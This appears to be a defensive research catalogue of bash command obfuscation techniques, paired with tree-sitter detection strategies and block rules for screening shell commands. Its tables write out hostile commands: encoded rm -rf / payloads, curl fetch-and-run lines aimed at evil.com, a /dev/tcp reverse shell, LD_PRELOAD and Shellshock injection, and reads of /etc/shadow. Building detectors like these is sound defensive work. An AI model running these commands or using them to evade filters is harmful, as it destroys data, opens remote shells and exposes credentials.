# Bash Command Obfuscation Corpus: Evasion Patterns for Static Analysis Security Tools

## Executive Summary

This corpus catalogs 51 bash command obfuscation techniques across 8 categories, each with the obfuscated command, what it actually does, risk level, and — critically — whether tree-sitter's bash grammar can structurally detect it. The patterns are sourced from Bashfuscator, obashfuscator, MITRE ATT&CK T1027.010, Atomic Red Team, GTFOBins, BSides research on tree-sitter malware detection, and command-line obfuscation research.[1][2][3][4][5][6][7][8]

The key architectural insight: **tree-sitter can always see the AST structure (eval nodes, command_substitution, process_substitution) but can never see what encoded/constructed payloads resolve to at runtime.** This creates two distinct tiers of detection:

- **Tier 1 — AST-Detectable:** Flag structural patterns (eval calls, encoded pipelines, suspicious node positions). Closes ~60% of evasion classes.
- **Tier 2 — Requires Runtime/Sandbox:** Patterns where the payload is fundamentally opaque (variable resolution, multi-stage payloads, encoded strings). Requires allowlist-only mode or sandboxed execution.

The corpus ships as both JSON and CSV for direct integration into test suites.





***

## 1. Eval-Based Obfuscation

Eval-based obfuscation wraps the actual payload in an encoding layer (base64, hex, octal, gzip, reversed strings) and uses `eval`, `$()`, or backticks to decode and execute at runtime. Tree-sitter always sees the `eval` node and `command_substitution` node, but the payload contents are opaque string literals that cannot be resolved statically.[9][10][1]

| ID | Name | Obfuscated Command | Actual | tree-sitter Detectable? |
|----|------|---------------------|--------|------------------------|
| 1.1 | Base64 eval | `eval "$(echo 'cm0gLXJmIC8=' \| base64 -d)"` | `rm -rf /` | ✅ eval + command_sub visible; payload opaque |
| 1.2 | Hex printf eval | `eval "$(printf '\x72\x6d\x20\x2d\x72\x66\x20\x2f')"` | `rm -rf /` | ✅ eval + printf visible; hex opaque |
| 1.3 | Octal printf eval | `eval "$(printf '\162\155\040\055\162\146\040\057')"` | `rm -rf /` | ✅ eval + printf visible; octal opaque |
| 1.4 | Nested base64 | `bash -c "$(base64 -d <<< "$(base64 -d ...)")"` | Multi-encoded payload | ✅ Nested command_sub visible |
| 1.5 | Backtick execution | `` eval `echo cm0gLXJmIC8= \| base64 -d` `` | `rm -rf /` | ✅ Backticks normalize to command_sub |
| 1.6 | Gzip+base64 eval | `eval "$(echo '...' \| base64 -d \| gunzip)"` | Compressed payload | ✅ Pipeline structure visible |
| 1.7 | xxd hex decode | `eval "$(echo '726d...' \| xxd -r -p)"` | `rm -rf /` | ✅ xxd in pipeline visible |
| 1.8 | rev (string reversal) | `eval "$(echo '/ fr- mr' \| rev)"` | `rm -rf /` | ✅ rev in pipeline visible[3] |

### Detection Strategy

Flag all `eval` calls unconditionally. Then flag these pipeline patterns feeding eval/bash/sh/$():

- `base64 -d`, `base64 --decode`
- `printf` with `\x`, `\0`, `\1`–`\7` escape patterns
- `xxd -r`, `gunzip`, `zcat`, `bzcat`, `xz -d`
- `rev` (especially with herestrings `<<<`)

**AST capability:** ✅ Structurally detectable. The `eval` node is always visible. The inner payload is always opaque. Policy: **flag all eval; require justification.**

***

## 2. Command Name Obfuscation

The command name itself is constructed at runtime via variable expansion, command substitution, string concatenation, path traversal, or ANSI-C quoting. Tree-sitter sees the expansion node in the command_name position but cannot resolve what binary it refers to.[11][12][2]

| ID | Name | Obfuscated Command | Actual | tree-sitter Detectable? |
|----|------|---------------------|--------|------------------------|
| 2.1 | Variable-expanded name | `CMD=rm; $CMD -rf /` | `rm -rf /` | ⚠️ Expansion visible; value requires taint tracking |
| 2.2 | Command sub in position | `$(echo rm) -rf /` | `rm -rf /` | ✅ command_sub in command position flaggable |
| 2.3 | Quote insertion | `r""m -rf /` | `rm -rf /` | ⚠️ Concatenated string visible; semantic resolution needed |
| 2.4 | Path traversal | `/usr/bin/../bin/rm -rf /` | `rm -rf /` | ✅ `..` in path detectable[4] |
| 2.5 | Quoted path segments | `/us"r"/b'i'n/rm -rf /` | `rm -rf /` | ⚠️ Embedded quotes visible; normalize to detect |
| 2.6 | Glob as command name | `/usr/bin/r? -rf /` | `rm -rf /` | ✅ Glob in command position flaggable |
| 2.7 | Alias/function shadow | `alias ls='rm -rf /'; ls` | `rm -rf /` | ✅ alias definition visible[13][14] |
| 2.8 | ANSI-C quoted name | `$'\x72\x6d' -rf /` | `rm -rf /` | ✅ ansi_c_string in command position flaggable[15] |

### Detection Strategy

Flag any non-literal node in `command_name` AST position:

- `simple_expansion` ($VAR) → requires taint tracking (Tier 2)
- `command_substitution` → always flag
- `ansi_c_string` ($'...') → always flag in command position
- Glob characters (`?`, `*`) in command path → always flag
- `..` in command path → always flag, normalize before allowlist check
- Embedded quotes in command path → strip quotes, re-check against allowlist

**AST capability:** ⚠️ Partially detectable. The *structure* is visible but variable resolution requires Tier 2 analysis.

***

## 3. Argument Obfuscation

Command arguments are hidden through IFS manipulation, glob expansion, brace expansion, ANSI-C quoting, or parameter expansion substrings. These techniques make the arguments invisible to pattern matching while preserving runtime behavior.[16][17][18]

| ID | Name | Obfuscated Command | Actual | tree-sitter Detectable? |
|----|------|---------------------|--------|------------------------|
| 3.1 | IFS manipulation | `IFS=,; CMD="rm,-rf,/"; $CMD` | `rm -rf /` | ✅ IFS assignment flaggable |
| 3.2 | Glob path substitution | `cat /et?/pas?wd` | `cat /etc/passwd` | ⚠️ Glob chars visible; expansion is runtime |
| 3.3 | Brace expansion | `echo {/etc/passwd,/etc/shadow}` | `echo /etc/passwd /etc/shadow` | ❌ No brace_expansion AST node[18] |
| 3.4 | ANSI-C quoting args | `cat $'\x2f\x65\x74\x63...'` | `cat /etc/passwd` | ✅ ansi_c_string node visible[15] |
| 3.5 | Variable expansion args | `F=/etc/passwd; cat $F` | `cat /etc/passwd` | ⚠️ Expansion visible; resolution needs taint tracking |
| 3.6 | Parameter substr | `X=rm_rf_/; ${X:0:2} -${X:3:2} ${X:6:1}` | `rm -rf /` | ✅ ${var:N:N} flaggable in command position |
| 3.7 | Heredoc string reversal | `rev <<<'dwssap/cte/ tac'` | `tac /etc/passwd` | ✅ rev + herestring visible[3][19] |

### Detection Strategy

- **IFS:** Flag any assignment to `IFS` variable. This is a near-universal obfuscation signal.
- **Globs in arguments:** Flag `?` and `*` in unquoted arguments to sensitive commands (cat, rm, chmod, etc.).
- **Brace expansion:** tree-sitter-bash does NOT parse brace expansion as a named node — it appears as a literal word with braces. Must use regex-level detection on the raw text.[18]
- **ANSI-C strings:** Flag `$'...'` nodes containing `\x` or `\0` escape sequences.
- **Parameter expansion substrings:** Flag `${var:N:N}` in command_name position.

**AST capability:** ⚠️ Mixed. IFS and ANSI-C are structurally visible. Brace expansion is NOT modeled in tree-sitter-bash. Globs require filesystem state.

***

## 4. Indirect Execution

Commands are executed indirectly via `source`, `exec`, function definitions, interpreter `-c` flags, `xargs`, or polyglot interpreters. The actual payload may be in a separate file, a different language, or constructed by an intermediary.[13][7]

| ID | Name | Obfuscated Command | Actual | tree-sitter Detectable? |
|----|------|---------------------|--------|------------------------|
| 4.1 | Source a file | `. /tmp/evil.sh` | Executes file contents in current shell | ✅ source/. visible; file content opaque |
| 4.2 | Source via process sub | `source <(curl -s https://evil.com/payload.sh)` | Fileless remote execution | ✅ source + process_sub visible |
| 4.3 | exec replacement | `exec /bin/sh -c "rm -rf /"` | Process replacement | ✅ exec + sh -c flaggable |
| 4.4 | Function shadowing | `cd() { rm -rf "$1"; }; cd /` | Redefines cd as destructive | ✅ function_definition visible[13] |
| 4.5 | bash -c with variables | `bash -c "$A$B$C"` | Whatever A+B+C resolve to | ⚠️ bash -c visible; content opaque |
| 4.6 | xargs execution | `echo 'rm -rf /' \| xargs -I {} bash -c '{}'` | Pipeline to execution | ✅ xargs + bash -c pattern visible |
| 4.7 | Python/Perl one-liner | `python3 -c "import os; os.system('rm -rf /')"` | Cross-language escape | ✅ interpreter -c visible; inner code is string |

### Detection Strategy

- Flag all `source`/`.` commands, especially with paths to writable directories or process substitution
- Flag all `exec` with shell interpreters as arguments
- Flag function definitions that shadow known builtins/commands (cd, ls, cat, chmod, etc.)
- Flag `bash/sh/zsh/dash -c` with any non-literal argument
- Flag `xargs` piping to shell interpreters
- Flag interpreter `-c` patterns (python*, perl, ruby, node) — the inner language code needs a secondary parser[7]

**AST capability:** ✅ Mostly detectable structurally. The execution *mechanism* is always visible. The *payload* may be opaque (file contents, variable values, inner language).

***

## 5. Multi-Stage Payloads

Download-and-execute, write-then-execute, and named pipe patterns split malicious intent across multiple steps, making each individual command appear benign.[20][21]

| ID | Name | Obfuscated Command | Actual | tree-sitter Detectable? |
|----|------|---------------------|--------|------------------------|
| 5.1 | curl pipe to bash | `curl -s https://evil.com/install.sh \| bash` | Remote code execution | ✅ Pipeline pattern visible[20] |
| 5.2 | wget+chmod+execute | `wget -q URL -O /tmp/m && chmod +x /tmp/m && /tmp/m` | Download, chmod, run | ✅ Sequence of commands visible |
| 5.3 | Write then source | `echo "rm -rf /" > /tmp/.hidden; source /tmp/.hidden` | File drop + source | ✅ Redirect + source visible |
| 5.4 | Named pipe (mkfifo) | `mkfifo /tmp/p; cat /tmp/p \| bash & curl -s URL > /tmp/p` | Pipe bridges download to shell | ⚠️ mkfifo visible; semantic link is Tier 2 |
| 5.5 | Heredoc to bash | `bash <<EOF\nrm -rf /\nEOF` | Heredoc payload delivery | ✅ Heredoc body IS visible in AST |

### Detection Strategy

- **curl/wget pipe to bash:** Flag `curl|bash`, `curl|sh`, `wget|bash` pipeline patterns. The ClickFix campaign (2024-2025) drove a 517% increase in this pattern[21].
- **Download+execute sequences:** Flag wget/curl writing to writable dirs followed by chmod +x and/or execution of the same path.
- **Write+source:** Flag echo/printf/cat redirecting to temp paths followed by source/bash of that path.
- **Named pipes:** Flag mkfifo followed by piping from same path to bash/sh.
- **Heredocs:** Parse heredoc bodies feeding bash/sh — this content IS visible in the tree-sitter AST.

**AST capability:** ✅ Structural patterns are detectable. Sequence analysis (tracking paths across commands) requires multi-statement analysis.

***

## 6. Environment Variable Abuse

Environment variables like LD_PRELOAD, PATH, BASH_ENV, and PROMPT_COMMAND can hijack execution flow, inject code, or establish persistence without modifying any binaries.[22][23][24]

| ID | Name | Obfuscated Command | Actual | tree-sitter Detectable? |
|----|------|---------------------|--------|------------------------|
| 6.1 | LD_PRELOAD injection | `LD_PRELOAD=/tmp/evil.so /usr/bin/id` | Shared library hijack | ✅ Variable assignment visible[23] |
| 6.2 | PATH manipulation | `export PATH=/tmp:$PATH; ls` | Resolves ls to /tmp/ls | ✅ PATH assignment visible |
| 6.3 | BASH_ENV injection | `BASH_ENV=/tmp/evil.sh bash -c "echo hello"` | Pre-execution hook | ✅ BASH_ENV assignment visible |
| 6.4 | PROMPT_COMMAND | `export PROMPT_COMMAND="curl ... \| bash"` | Persistent per-prompt execution | ✅ PROMPT_COMMAND assignment visible |
| 6.5 | Shellshock-style export | `env x='() { :;}; echo pwned' bash -c "echo test"` | Function injection via env | ✅ env + '() {' pattern visible |

### Detection Strategy

Maintain a blocklist of dangerous environment variable names and flag any assignment to them:

- **Execution hijack:** `LD_PRELOAD`, `LD_LIBRARY_PATH`, `PATH` (prepending writable dirs)
- **Code injection:** `BASH_ENV`, `ENV`, `BASH_FUNC_*`, `PROMPT_COMMAND`
- **Shellshock indicators:** `() {` pattern in any env variable value

Elastic Security's detection rules already flag LD_PRELOAD and LD_LIBRARY_PATH usage as suspicious.[23]

**AST capability:** ✅ Fully detectable structurally. Variable assignments with these names are visible in the AST.

***

## 7. Heredoc, Process Substitution, and Redirection Tricks

Process substitution `<()`, herestrings `<<<`, heredocs `<<`, and /dev/tcp pseudo-devices provide alternative channels for payload delivery and execution.[25][26]

| ID | Name | Obfuscated Command | Actual | tree-sitter Detectable? |
|----|------|---------------------|--------|------------------------|
| 7.1 | Process sub execution | `bash <(curl -s https://evil.com/payload.sh)` | Fileless remote execution | ✅ process_substitution visible |
| 7.2 | Herestring to eval | `eval <<< "rm -rf /"` | Herestring payload | ✅ Content visible in AST |
| 7.3 | /dev/tcp reverse shell | `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` | Reverse shell | ✅ /dev/tcp path visible |
| 7.4 | Heredoc to interpreter | `python3 <<PYEOF\nimport os\nos.system("rm -rf /")\nPYEOF` | Cross-language heredoc | ✅ Heredoc body visible |
| 7.5 | fd manipulation + /dev/tcp | `exec 3<>/dev/tcp/evil.com/80; echo ... >&3; bash <&3` | Manual HTTP + execute | ✅ All fd redirects visible |
| 7.6 | Coproc evasion | `coproc bash; echo "rm -rf /" >&${COPROC[1]}` | Background shell IPC | ✅ coproc node visible |

### Detection Strategy

- Flag `<()` containing `curl`, `wget`, or any network command
- Flag any redirect to `/dev/tcp/` or `/dev/udp/` — these are almost never legitimate[25]
- Flag `coproc` creating shell processes (very rarely used legitimately)
- Parse heredoc and herestring content when feeding bash/sh/eval — this content IS visible to tree-sitter
- Flag `exec` with fd assignment (exec N<>/dev/tcp/...)

**AST capability:** ✅ Fully detectable structurally. Process substitution, heredocs, and redirects are all named node types in tree-sitter-bash.

***

## 8. Bashfuscator / Tool-Generated Obfuscation

Dedicated obfuscation frameworks (Bashfuscator, obashfuscator) combine multiple techniques into layered payloads. Bashfuscator offers 12+ mutators: `command/case_swapper`, `command/reverse`, `compress/bzip2`, `compress/gzip`, `encode/base64`, `encode/urlencode`, `string/file_glob`, `string/folder_glob`, `string/forcode`, `string/hex_hash`, `token/ansi-c_quote`, and `token/special_char_only`.[5][6]

| ID | Name | Obfuscated Command | Actual | tree-sitter Detectable? |
|----|------|---------------------|--------|------------------------|
| 8.1 | Array shuffle | `eval "$(arr=(...); for i in ...; do printf %s "${arr[$i]}"; done)"` | Array reconstruction | ⚠️ Structure visible; intent opaque |
| 8.2 | Variable-per-char | `Az='rm';Bz=' -r';Cz='f /';eval "$Az$Bz$Cz"` | Single-char variable assembly | ✅ Many short assignments + eval flaggable[5] |
| 8.3 | Case swapper | `echo "RM -RF /" \| tr "[:upper:]" "[:lower:]" \| bash` | Case transformation to bash | ✅ tr + bash pipeline visible |
| 8.4 | Special chars only | `${!#}<<<${!#}\{\}` | Special parameter magic | ⚠️ Expansion nodes visible; semantics opaque |
| 8.5 | File glob reconstruction | `eval "$(printf %s /???/???/??64 <<<... \| /???/???/??64 -d)"` | Glob paths to binaries | ✅ Globs in command paths flaggable |

### Detection Strategy

Tool-generated obfuscation produces distinctive statistical signals:

- **High entropy variable names** (Az, Bz, Cz — single/double char vars in bulk)
- **Many short variable assignments** followed by eval of their concatenation
- **Deeply nested** eval/command_substitution/pipeline structures
- **Glob patterns** matching binary paths (/???/???/??64)
- **Array declarations** with single-character elements followed by indexed reconstruction

A heuristic scoring system works well here: if a command scores high on multiple signals (eval count + variable count + nesting depth + entropy), it's almost certainly obfuscated.

**AST capability:** ⚠️ Partially detectable. Structural patterns are visible but semantic resolution is impossible statically. Best defense is entropy/heuristic scoring combined with allowlist-only mode.

***

## Tree-Sitter Detection Capability Matrix

| Evasion Class | AST Detection | Policy |
|--------------|---------------|--------|
| eval/exec calls | ✅ Always visible as command_name | Block or require justification |
| command_substitution in command position | ✅ Visible as AST node type | Always flag |
| base64/hex/gzip in pipelines | ✅ Pipeline structure visible | Flag when feeding eval/bash/sh |
| Variable expansion in command position | ⚠️ Expansion node visible, value opaque | Requires taint tracking (Tier 2) |
| ANSI-C quoting ($'\\x...') | ✅ ansi_c_string node type | Flag in command position or with hex content |
| Brace expansion | ❌ No AST node; appears as literal word | Regex-level detection only |
| IFS manipulation | ✅ Variable assignment visible | Flag all IFS assignments |
| Glob in command position | ✅ Glob characters visible in word | Flag ?, * in command_name |
| Path traversal (..) | ✅ Visible in path string | Normalize and re-check |
| source/. commands | ✅ source_command visible | Flag with writable paths |
| Process substitution <() | ✅ process_substitution node | Flag with curl/wget inside |
| Heredoc content | ✅ heredoc_body visible and parseable | Parse content for dangerous commands |
| /dev/tcp redirects | ✅ Path visible in redirect target | Block unconditionally |
| LD_PRELOAD/BASH_ENV | ✅ Variable assignment visible | Block unconditionally |
| curl\|bash pipelines | ✅ Pipeline structure visible | Block unconditionally |
| Function shadowing | ✅ function_definition visible | Check against builtin list |
| Multi-stage sequences | ⚠️ Individual commands visible | Requires cross-statement analysis |
| Tool-generated obfuscation | ⚠️ Patterns visible, intent opaque | Entropy/heuristic scoring |

***

## Recommended Architecture

Based on this corpus, a layered defense architecture emerges:

### Layer 1: AST Rules (tree-sitter)
Static rules that flag structural patterns. These are fast, deterministic, and catch ~60% of evasion classes. Key rules:

- Block `eval`, `exec` (with shell args), `source <()` unconditionally
- Block `/dev/tcp`, `/dev/udp` redirects
- Block `LD_PRELOAD`, `BASH_ENV`, `PROMPT_COMMAND` assignments
- Block `curl|bash`, `wget|sh` pipeline patterns
- Flag `command_substitution` or `expansion` in command_name position
- Flag `ansi_c_string` with hex/octal escapes
- Flag `IFS` assignments
- Flag function definitions shadowing builtins

### Layer 2: Heuristic Scoring
Statistical analysis for tool-generated obfuscation:[6][5]

- Variable name entropy (many single-char vars = suspicious)
- Nesting depth (eval wrapping command_sub wrapping pipeline)
- Encoding function density (base64, xxd, printf with escapes)
- Total eval/bash -c count per script

### Layer 3: Allowlist-Only Mode
For the evasion classes that fundamentally cannot be detected statically (variable-expanded command names, multi-stage payloads with runtime-constructed paths), the only safe defense is an allowlist of permitted commands and patterns. An LLM generating bash commands should be constrained to a known-safe vocabulary.[27]

### Layer 4: Sandbox Execution
For commands that pass Layers 1-3, sandbox execution via bubblewrap or firejail provides the final safety net. Firejail uses Linux namespaces, seccomp filters, and AppArmor to restrict what a process can access. Bubblewrap is lower-level and used internally by Flatpak.[28][29]

***

## Existing Frameworks and References

| Framework | Purpose | Key Patterns |
|-----------|---------|-------------|
| Bashfuscator | Offensive bash obfuscation | 12+ mutators: ANSI-C quote, case swap, base64, gzip, file_glob, special chars[6] |
| obashfuscator | Simple base64/variable obfuscation | Multi-layer base64, variable-per-char decomposition[5] |
| MITRE ATT&CK T1027.010 | Obfuscation taxonomy | String splitting, rev, globbing, env var tricks, path traversal[3][4] |
| Atomic Red Team T1027 | Detection test cases | Base64 decode, encoded PowerShell, obfuscated commands[8][30] |
| GTFOBins | Living-off-the-land binaries | Shell escapes from 300+ Unix executables[7] |
| ArgFuscator.net | Command-line argument obfuscation | 68 Windows executables, Linux support planned[2] |
| Elastic Security Rules | Production detection rules | LD_PRELOAD detection, restricted shell breakout[23][31] |
| BSides SAT 2024 Research | tree-sitter for malware detection | Tree-sitter queries for obfuscated PowerShell/Bash[1] |
